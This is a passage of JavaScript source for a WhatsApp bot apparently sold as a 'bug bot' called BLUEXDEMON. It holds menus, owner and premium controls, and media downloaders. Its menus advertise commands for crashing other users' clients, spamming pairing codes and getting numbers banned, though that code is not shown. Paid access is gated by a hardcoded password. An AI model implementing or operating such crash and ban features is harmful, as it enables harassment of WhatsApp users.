                const allmenu = `┏━━ ｢ \`𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐

┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴀᴅᴅᴏᴡɴᴇʀ
│ ⑄ ᴀᴅᴅᴘʀᴇᴍ
│ ⑄ ɢᴇᴛᴏᴡɴᴇʀ 
│ ⑄ ɢᴇᴛᴘʀᴇᴍ
│ ⑄ ᴅᴇʟᴏᴡɴᴇʀ
│ ⑄ ᴅᴇʟᴘʀᴇᴍ
│ ⑄ ᴘᴜʙʟɪᴄ
│ ⑄ sᴇʟғ
│ ⑄ ᴘɪɴɢ
│ ⑄ ʙʟᴏᴄᴋ 
│ ⑄ ᴜɴʙʟᴏᴄᴋ 
│ ⑄ ᴍᴏᴅᴇ
│ ⑄ ᴅᴇʟ
│ ⑄ ᴊᴏɪɴ
│ ⑄ ᴄʟᴇᴀʀᴄʜᴀᴛ
│ ⑄ ꜱᴇᴛɴᴀᴍᴇ
│ ⑄ ꜱᴇᴛʙɪᴏ
│ ⑄ ʀᴇꜱᴛᴀʀᴛ
│ ⑄ ꜱᴇᴛᴘᴘ
┗─────────────❐

┏─『 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑𝐒\` 』
│ ⑄ ᴛɪᴋᴛᴏᴋ
│ ⑄ ꜰᴀᴄᴇʙᴏᴏᴋ 
│ ⑄ ɪɴꜱᴛᴀɢʀᴀᴍ 
│ ⑄ ʏᴛꜱᴇᴀʀᴄʜ
│ ⑄ ʏᴛꜱ
│ ⑄ ᴘʟᴀʏ 
│ ⑄ ꜱᴏɴɢ
│ ⑄ ʏᴛᴠɪᴅᴇᴏꜱ 
│ ⑄ ꜱᴘᴏᴛɪꜰʏ 
│ ⑄ ʟʏʀɪᴄꜱ
┗─────────────❐

┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ɢᴄʟɪɴᴋ
│ ⑄ ꜱᴠᴄᴏɴᴛᴀᴄᴛ 
│ ⑄ ʜɪᴅᴇᴛᴀɢ
│ ⑄ ᴛᴀɢ 
│ ⑄ ᴛᴀɢᴀʟʟ 
│ ⑄ ᴀᴅᴅ
│ ⑄ ᴋɪᴄᴋ 
│ ⑄ ᴘʀᴏᴍᴏᴛᴇ 
│ ⑄ ᴅᴇᴍᴏᴛᴇ 
│ ⑄ ᴍᴜᴛᴇ
│ ⑄ ᴜɴᴍᴜᴛᴇ
│ ⑄ ɪɴᴠɪᴛᴇ 
│ ⑄ ʟᴇᴀᴠᴇɢᴄ
│ ⑄ ᴄʟᴏꜱᴇɢᴄ
│ ⑄ ᴏᴘᴇɴɢᴄ
│ ⑄ ꜱᴇᴛᴅᴇꜱᴄ
│ ⑄ ɢᴇᴛᴘᴘ
│ ⑄ ʀᴇꜱᴇᴛɢᴄʟɪɴᴋ
┗─────────────❐

┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴜᴘᴅᴀᴛᴇ
│ ⑄ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ⑄ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│ ⑄ ᴀɪ 
│ ⑄ ᴠᴠ
│ ⑄ ɢᴇᴛꜱᴇꜱꜱɪᴏɴ 
│ ⑄ ᴀᴜᴛᴏꜱᴛᴀᴛᴜꜱ
│ ⑄ ʟɪꜱᴛʙʟᴏᴄᴋ 
│ ⑄ ᴅᴇᴠɪᴄᴇ 
│ ⑄ ɢᴇᴛɪᴘ
│ ⑄ ᴛᴏᴛᴀʟᴄᴍᴅ
│ ⑄ ʀᴜɴᴛɪᴍᴇ 
│ ⑄ ᴛɪᴍᴇ
│ ⑄ ᴇxᴄʜᴀɴɢᴇ 
┗─────────────❐


┏─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴛᴀᴋᴇ
│ ⑄ ʜᴅᴠɪᴅᴇᴏ
│ ⑄ ꜱᴛɪᴄᴋᴇʀ 
│ ⑄ ʟᴏᴠᴇ
│ ⑄ ᴀɴɢʀʏ
│ ⑄ ᴄᴏɴꜰᴜꜱᴇ
┗─────────────❐

┏─『 \`𝐒𝐓𝐘𝐋𝐄 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ɢʟɪᴛᴄʜᴛᴇxᴛ 
│ ⑄ ᴡʀɪᴛᴇᴛᴇxᴛ 
│ ⑄ ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│ ⑄ ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│ ⑄ ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│ ⑄ ɴᴇᴏɴɢʟɪᴛᴄʜ 
│ ⑄ ꜰʟᴀɢᴛᴇxᴛ 
│ ⑄ ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│ ⑄ ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│ ⑄ ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│ ⑄ ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│ ⑄ ʟᴏɢᴏᴍᴀᴋᴇʀ 
│ ⑄ ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│ ⑄ ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│ ⑄ ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│ ⑄ ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│ ⑄ ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│ ⑄ ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│ ⑄ ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│ ⑄ ʟᴜxᴜʀʏɢᴏʟᴅ 
│ ⑄ ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│ ⑄ ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│ ⑄ ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│ ⑄ 1917ꜱᴛʏʟᴇ 
│ ⑄ ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│ ⑄ ʀᴏʏᴀʟᴛᴇxᴛ 
│ ⑄ ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│ ⑄ ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│ ⑄ ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
┗─────────────❐
`;

                // Send the image with the menu
                const image = fs.readFileSync('./database/image/xbug.jpg');
                await blue.sendMessage(m.chat, {
                    image: image,
                    caption: allmenu
                });

                break;
            }
            case 'specialmenu': {
                await loading()
                const version = require("baileys/package.json").version;
                let run = runtime(process.uptime());
                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
                const allmenu = `┏━━ ｢ \`𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐

┏─『 \`𝐒𝐏𝐄𝐂𝐈𝐀𝐋𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴛᴇᴍᴘʙᴀɴ
│ ⑄ ᴀɴᴛɪʙᴜɢᴏɴ
│ ⑄ ᴀɴᴛɪʙᴜɢᴏꜰꜰ 
│ ⑄ ꜱᴘᴀᴍᴘᴀɪʀ
│ ⑄ ʙᴀɴɴᴜᴍ
┗─────────────❐
`;

                // Send the image with the menu
                const image = fs.readFileSync('./database/image/xbug.jpg');
                await blue.sendMessage(m.chat, {
                    image: image,
                    caption: allmenu
                });
                // Send the audio as a push-to-talk (PTT) message
                await blue.sendMessage(m.chat, {
                    audio: darkphonk,
                    mimetype: 'audio/mp4',
                    ptt: true
                });
                break;
            }
            case 'bugmenu': {
                await loading()
                const version = require("baileys/package.json").version;
                let run = runtime(process.uptime());
                const darkphonk = fs.readFileSync('./database/Phonk.mp3');
                const allmenu = `┏━━ ｢ \`𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐

┏─『 \`𝐁𝐔𝐆𝐌𝐄𝐍𝐔\` 』
│ ⑄ ʙʟᴜᴇᴅɪᴅ
│ ⑄ ʙʟᴜᴇꜱᴀʏꜱ
│ ⑄ ʜᴇʜᴇ
│ ⑄ ɴɪɢʜᴛʏ
│ ⑄ xɪᴏꜱ
│ ⑄ ᴏᴠᴇʀꜰʟᴏᴡ 
│ ⑄ ᴄʀᴀꜱʜꜰʟᴏᴡ
│ ⑄ ᴠᴀꜱɪᴏɴ
┗─────────────❐
`;

                // Send the image with the menu as a caption
                const image = fs.readFileSync('./database/image/xbug.jpg');
                await blue.sendMessage(m.chat, {
                    image: image,
                    caption: allmenu
                });
                // Send the audio as a push-to-talk (PTT) message
                await blue.sendMessage(m.chat, {
                    audio: darkphonk,
                    mimetype: 'audio/mp4',
                    ptt: true
                });

                break;
            }

            case "addprem": {
                if (!isOwner) return reply(mess.only.owner);
                if (!args[0]) return reply(`Usage: ${prefix + command} number\nExample: ${prefix + command} 62×××`);
                prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
                let ceknya = await blue.onWhatsApp(prrkek);
                if (ceknya.length == 0) return reply(`Enter a valid number registered on WhatsApp!`);
                prem.push(prrkek);
                fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem));
                reply(`Number ${prrkek} has been added as Premium!`);
            }
            break;
            case "addbuyer": {

                // Prompt for password and validate
                if (args[0] !== "bluedemon-solos") {
                    return reply(`Incorrect password! Example: ${prefix + command} password 254×××\n*MESSAGE wa.me/254736453394 FOR PASSWORD*.`);
                }

                // Remove the password argument from args and proceed with the rest
                const numberArg = args.slice(1).join(" ");

                // Check if the number argument is missing or empty
                if (!numberArg) {
                    return reply(`Usage: ${prefix + command} password number\nExample: ${prefix + command} password 62×××`);
                }

                // Clean the phone number and check its format (only numbers allowed)
                const cleanedNumber = numberArg.split("|")[0].replace(/[^0-9]/g, '');

                // Validate phone number format (e.g., check length or country code)
                if (cleanedNumber.length < 10) {
                    return reply("Invalid number format! Please enter a valid phone number in the correct format.\nExample: 62XXXXXXXXXX");
                }

                // Check if the number is registered on WhatsApp
                prrkek = cleanedNumber + `@s.whatsapp.net`;
                let ceknya = await blue.onWhatsApp(prrkek);

                // If the number is not registered on WhatsApp
                if (ceknya.length == 0) {
                    return reply(`The number ${cleanedNumber} is not registered on WhatsApp! Please enter a valid number.`);
                }

                // Add to premium list
                prem.push(prrkek);
                fs.writeFileSync("./database/lib/secret.json", JSON.stringify(prem));

                // Success message
                reply(`Number ${prrkek} has been successfully added as buyer!`);
            }
            break;
            case "delprem": {
                if (!isOwner) return reply(mess.only.owner);
                if (!args[0]) return reply(`Usage: ${prefix + command} number\nExample: ${prefix + command} 62×××`);
                ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
                unp = prem.indexOf(ya);
                prem.splice(unp, 1);
                fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem));
                reply(`Number ${ya} has been removed from Premium!`);
            }
            break;
            case "addowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`Usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
                let ceknye = await blue.onWhatsApp(bnnd + `@s.whatsapp.net`)
                if (ceknye.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
                ownerNumber.push(bnnd)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${bnnd} Has become an owner!!!`)
                break
            case "delowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = ownerNumber.indexOf(ya)
                ownerNumber.splice(unp, 1)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${ya} Has Been Deleted by Owner!!!`)
                break

            case 'gclink':
            case 'grouplink':
            case 'gruplink': {
                if (!m.isGroup) return reply(mess.only.group);
                try {
                    let response = await blue.groupInviteCode(m.chat);
                    let groupMetadata = await blue.groupMetadata(m.chat);

                    let groupInfo = `👥 *GROUP LINK*\n` +
                        `📛 *Name :* ${groupMetadata.subject}\n` +
                        `👤 *Group Owner :* ${groupMetadata.owner ? '+' + groupMetadata.owner.split`@`[0] : 'Not known'}\n` +
                        `🌱 *ID :* ${groupMetadata.id}\n` +
                        `🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n` +
                        `👥 *Member :* ${groupMetadata.participants.length}\n`;

                    await blue.sendText(m.chat, groupInfo, m);
                } catch (error) {
                    console.error('Error fetching group link:', error);
                    return reply('Failed to retrieve the group link.');
                }
            }
            break;
            case 'block': {
                if (!isOwner) return reply(mess.only.owner);

                let users;

                if (isGroup) {
                    // In a group, block the sender of the quoted message or the number from the input text
                    if (m.quoted && m.quoted.sender) {
                        users = m.quoted.sender;
                    } else if (text) {
                        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }
                } else {
                    // In a private chat, block the other person's number
                    users = m.chat;
                }

                if (users) {
                    // Ensure the number is not an empty string and contains valid characters
                    if (users.replace(/[^0-9]/g, '').length < 7) {
                        return reply('Invalid number. Please provide a valid number.');
                    }

                    // Block the user
                    await blue.updateBlockStatus(users, "block");
                    bluereply(mess.success);
                } else {
                    reply("Please reply to the message or input the number you want to block.");
                }
                break;
            }
            case 'clearchat':
            case 'clear': {
                if (!isOwner) return bluereply(mess.only.owner);

                blue.chatModify({
                        delete: true,
                        lastMessages: [{
                            key: m.key,
                            messageTimestamp: m.messageTimestamp
                        }]
                    },
                    m.chat
                );

                bluereply(mess.success);
            }
            break;
            case 'getowner': {
                if (!isOwner) return reply(mess.only.owner);

                // Read the owner list from the JSON file
                let ownerList;
                try {
                    ownerList = JSON.parse(fs.readFileSync('./database/dtbs/owner.json', 'utf8'));
                } catch (error) {
                    return reply("Failed to read the owner list.");
                }

                // Check if the owner list is empty
                if (ownerList.length === 0) {
                    return reply("No owner found.");
                }

                // Create a message with the list of owners
                const ownerMessage = `List of Owners:\n${ownerList.map(num => `- ${num}`).join('\n')}`;

                // Send the message
                reply(ownerMessage);
            }
            break;
            case 'getprem': {
                if (!isOwner) return reply(mess.only.owner);

                // Read the premium list from the JSON file
                let premiumList;
                try {
                    premiumList = JSON.parse(fs.readFileSync('./database/dtbs/premium.json', 'utf8'));
                } catch (error) {
                    return reply('Failed to read the premium list.');
                }

                // Check if the premium list is empty
                if (premiumList.length === 0) {
                    return reply('No premium users found.');
                }

                // Create a message with the list of premium users
                const premiumMessage = `*Premium List*\n\n` +
                    `${premiumList.map(num => `- ${num}`).join('\n')}\n\n` +
                    `*Total: ${premiumList.length}*`;

                // Send the message
                await blue.sendText(m.chat, premiumMessage, m);
                break;
            }
            case "delowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = ownerNumber.indexOf(ya)
                ownerNumber.splice(unp, 1)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${ya} Has Been Deleted by Owner!!!`)
                break
            case 'public': {
                if (!isOwner) return reply(mess.only.owner)
                blue.public = true
                reply(' *\`Public mode activated\`* ')
            }
            break
            case 'self': {
                if (!isOwner) return reply(mess.only.owner)
                blue.public = false
                reply(' *\`Private mode activated\`* ')
            }
            break
            case 'ping': {
                // Capture the start time for ping calculation
                const startTime = performance.now();

                // Send a preliminary message to notify that the ping is being measured
                const pingMsg = await blue.sendMessage(m.chat, {
                    text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸'
                });

                // Capture the end time after the message is sent
                const endTime = performance.now();
                const latensi = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds

                // Relay an edited message with the calculated ping
                await blue.relayMessage(m.chat, {
                    protocolMessage: {
                        key: pingMsg.key,
                        type: 14, // Protocol type for editing messages
                        editedMessage: {
                            conversation: `*ᴅᴇᴍᴏɴ ʙᴜɢ ꜱᴩᴇᴇᴅ ${latensi} ᴍꜱ*`
                        }
                    }
                }, {});
            }
            break;
            case 'unblock': {
                if (!isOwner) return reply(mess.only.group);

                let users;

                if (isGroup) {
                    // In a group, unblock the sender of the quoted message or the number from the input text
                    users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                } else {
                    // In a private chat, unblock the other person's number
                    users = m.chat;
                }

                if (users) {
                    // Ensure the number is not an empty string and contains valid characters
                    if (users.replace(/[^0-9]/g, '').length < 7) {
                        return reply('Invalid number. Please provide a valid number.');
                    }

                    // Unblock the user
                    await blue.updateBlockStatus(users, "unblock");
                    reply(`Successfully unblocked user ${users.split("@")[0]}`);
                } else {
                    reply("Please reply to the message or input the number you want to unblock.");
                }
                break;
            }
            case 'mode': {
                // Check if the user has the right to change the mode (Only creator or bot owner)
                if (!isOwner) return reply(mess.only.owner);

                // Toggle between public and private modes
                if (q === 'public') {
                    blue.public = true; // Set to public mode
                    reply("*[sᴜᴄᴄᴇss]* *ᴩᴜʙʟɪᴄ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                } else if (q === 'self' || q === 'private') {
                    blue.public = false; // Set to private mode
                    reply("*[sᴜᴄᴄᴇss]* *ᴩʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                } else {
                    // Display current mode
                    let currentMode = blue.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
                    reply(`*ᴛʜᴇ ʙᴏᴛ ɪꜱ ᴄᴜʀʀᴇɴᴛʟy ɪɴ ${currentMode} ᴍᴏᴅᴇ*`);
                }
            }
            break;
            case 'delete':
            case 'del':
            case 'd': {
                if (!isOwner) return reply(mess.only.owner)
                if (!m.quoted) return; // Exit if there is no quoted message

                try {
                    await blue.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false, // This is set to false to delete others' messages
                            id: m.quoted.id,
                            participant: m.quoted.sender // The sender of the quoted message
                        }
                    });
                } catch {
                    // No response or error logging
                }
            }
            break
            case 'join': {
                if (!isOwner) return reply(mess.owner); // Check if the user is the owner
                if (!text) return reply('Enter Group Link!');
                if (!isUrl(text) || !text.includes('whatsapp.com')) return reply('Invalid Link!');

                const result = text.split('https://chat.whatsapp.com/')[1];
                bluereply(mess.wait);

                try {
                    await blue.groupAcceptInvite(result);
                    bluereply(mess.success);
                } catch (error) {
                    // Handle different error responses
                    if (error.response) {
                        switch (error.response.status) {
                            case 400:
                                return reply('Group Not Found❗');
                            case 401:
                                return reply('Bot Kicked From The Group❗');
                            case 409:
                                return reply('Bot Has Already Joined the Group❗');
                            case 410:
                                return reply('Group URL Has Been Reset❗');
                            case 500:
                                return reply('Group Is Full❗');
                            default:
                                return reply('An unknown error occurred.');
                        }
                    }
                    reply('An unexpected error occurred.');
                }
                break;
            }
            case 'setbio':
            case 'setbotbio': {
                if (!isOwner) return reply(mess.only.owner);
                if (!q) return reply(`*TEXT*`);

                // Sets bot bio/status using blue
                await blue.updateProfileStatus(q);
                reply(`*Bio has been changed to ${q}*`);
            }
            break;
            case 'restart':
                if (!isOwner) return reply(mess.only.owner)
                reply(`*RESTARTING 𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍*`)
                await sleep(3000)
                process.exit()
                break
            case 'tiktok':
            case 'tt': {
                if (!text) return reply(`Example: ${prefix + command} link`);
                bluereply(mess.wait);
                try {
                    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`);
                    const vidnya = data.video.noWatermark;
                    const caption = `*[ TIKTOK DOWNLOADER ]*

\`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
`;
                    blue.sendMessage(m.chat, {
                        caption: caption,
                        video: {
                            url: vidnya
                        }
                    }, {
                        quoted: m
                    })
                } catch {
                    const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`);
                    const videoUrl = response.result.video;
                    const caption = `*[ TIKTOK DOWNLOADER ]*

*Likes*: _${response.result.statistics.likeCount ?? ''}_
*Comments*: _${response.result.statistics.commentCount ?? ''}_
*Shares*: _${response.result.statistics.shareCount ?? ''}_
*By*: _${response.result.author.nickname ?? ''}_

\`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
        `;
                    blue.sendMessage(m.chat, {
                        caption: caption,
                        video: {
                            url: videoUrl
                        }
                    }, {
                        quoted: m
                    })
                }
                break;
            }
            case 'fb':
            case 'facebook':
            case 'facebookvid': {
                if (!text) return reply(`Please send a Facebook video link\n\nEXAMPLE :\n*${prefix + command}* https://fb.watchvhgjhz`)
                bluereply(mess.wait);
                try {
                    const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
                    const tex = `*[ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname} ]*`;
                    const videoBuffer = data.result.HD;
                    blue.sendMessage(m.chat, {
                        caption: tex,
                        video: {
                            url: videoBuffer
                        }
                    }, {
                        quoted: m
                    });
                } catch (error) {
                    reply('*AN ERROR OCCURED*')
                }
            }
            break
            case 'instagram':
            case 'igdl':
            case 'ig':
            case 'igvideo':
            case 'igimage':
            case 'igvid':
            case 'igimg': {
                if (!text) return reply(`You need to provide the URL of any Instagram video, post, reel, image`)
                bluereply(mess.wait)
                try {
                    const data = await fetchJson(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
                    if (data && data.result && data.result.length > 0 && data.result[0].url) {
                        const hasil = data.result[0].url;
                        const cap = `𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}`;
                        blue.sendMessage(m.chat, {
                            video: {
                                url: hasil
                            },
                            caption: cap
                        }, {
                            quoted: m
                        });
                    } else {
                        throw new Error('URL not found in result');
                    }
                } catch (error) {
                    console.log("AN ERROR OCCURED");
                }
            }
            break
            case 'yts':
            case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} Demon slayer`);
                bluereply(mess.wait);
                const yts = require("yt-search");
                let search = await yts(text);
                let teks = `YouTube Search\n\nResults for: *${text}*\n\n`;
                let no = 1;

                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`;
                }

                blue.sendMessage(m.chat, {
                    image: {
                        url: search.all[0].thumbnail
                    },
                    caption: teks
                }, {
                    quoted: m
                });
                break;
            }
            case 'spotify':
            case 'play':
            case 'song': {
                if (!text) return reply('Enter the song title!')
                let result = await searchSpotify(text)
                let caption = result.map((v, i) => {
                    return {
                        header: "",
                        title: v.name,
                        description: `${botname} 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑.....`,
                        id: '.spdl ' + v.link
                    }
                })
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: {
                                body: {
                                    text: `*🔎 Search Results From* ${text}\n*Please select the list below*`,
                                },
                                footer: {
                                    text: 'ᴅᴇᴍᴏɴ ᴛᴇᴄʜ'
                                },
                                header: {
                                    title: "MUSIC - SEARCH",
                                    subtitle: "",
                                    hasMediaAttachment: false,
                                },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "CLICK HERE",
                                            sections: [{
                                                title: "",
                                                rows: caption
                                            }]
                                        })
                                    }]
                                }
                            }
                        }
                    }
                }, {
                    quoted: m
                }, {});
                await blue.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                });
            }
            break
            case 'spdl':
            case 'spotifydl': {
                if (!text) return reply('Enter Link')
                let result = await spotifydl(text)
                let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nᴅᴇᴍᴏɴ ʙᴜɢ`
                const p = await new canvafy.Spotify()
                    .setTitle(result.title)
                    .setAuthor("𝐒𝐏𝐎𝐓𝐈𝐅𝐘 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑")
                    .setTimestamp(40, 100)
                    .setOverlayOpacity(0.8)
                    .setBorder("#fff", 0.8)
                    .setImage(result.image)
                    .setBlur(3)
                    .build();

                await blue.sendMessage(from, {
                    image: p,
                    caption: captionvid
                }, {
                    quoted: m
                })
                blue.sendMessage(m.chat, {
                    audio: {
                        url: result.download
                    },
                    mimetype: 'audio/mpeg',
                    filename: 'MP3 BY ' + 'ᴅᴇᴍᴏɴ-ʙᴜɢ'
                }, {
                    quoted: m
                });
            }
            break
            case 'ytvideo':
            case 'ytmp4': {
                if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
                bluereply(mess.wait)
                try {
                    reply('*The video sending process may take 1-3 minutes if the video is too long!*')
                    let proces = await (await fetch(`https://widipe.com/download/ytdl?url=${text}`)).json()
                    let video4 = proces.result.mp4;
                    const ytc = `*[ YOUTUBE DOWNLOADER ]*
  *title* ${proces.result.title}
  
  ©${botname}`;
                    blue.sendMessage(m.chat, {
                        video: {
                            url: video4
                        },
                        caption: ytc
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    reply('*an error occurred :*' + e);
                }
            }
            break
            case 'lirik':
            case 'lyrics': {
                try {
                    if (!text) return reply(`What lyrics are you looking for?\nExample usage: ${prefix}lyrics Thunder`);
                    bluereply(mess.wait);

                    // Fetch lyrics
                    const hasil = await fetchJson(`https://widipe.com/lirik?text=${encodeURIComponent(text)}`);
                    const xeonlirik = `
*Title :* ${hasil.result.title}
*Artist:* ${hasil.result.artist}
*Url :* ${hasil.result.url}

*Lyrics :* ${hasil.result.lyrics}
        `.trim();

                    // Prepare image for header
                    const headerMedia = await prepareWAMessageMedia({
                        image: fs.readFileSync('./database/image/xbug.jpg')
                    }, {
                        upload: blue.waUploadToServer
                    });

                    // Create interactive message
                    const interactiveMessage = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {},
                                    deviceListMetadataVersion: 2
                                },
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: botname
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: xeonlirik
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        hasMediaAttachment: true,
                                        ...headerMedia
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [{
                                            name: "quick_reply",
                                            buttonParamsJson: `{\"display_text\":\"${botname}\",\"id\":\"lyrics_reply\"}`
                                        }]
                                    }),
                                    contextInfo: {
                                        mentionedJid: [m.sender],
                                        forwardingScore: 999,
                                        isForwarded: true,
                                        forwardedNewsletterMessageInfo: {
                                            newsletterJid: '120363303045895814@newsletter',
                                            newsletterName: botname,
                                            serverMessageId: 143
                                        }
                                    }
                                })
                            }
                        }
                    };

                    // Generate and send the interactive message
                    const msgs = generateWAMessageFromContent(m.chat, interactiveMessage, {
                        quoted: m
                    });
                    await blue.relayMessage(m.chat, msgs.message, {
                        messageId: msgs.key.id
                    });

                } catch (error) {
                    reply(`An error occurred: ${error.message}`);
                }
                break;
            }
            case 'repo':
            case 'channel':
            case 'script':
            case 'sc': {
                const repo = `
┃ 👾 *\`Script Repository\`* 👾
┃    🔗 [GitHub Repository](https://github.com/BLUEXDEMONl/BLUEXDEMON-BUG-V3.git)
┃
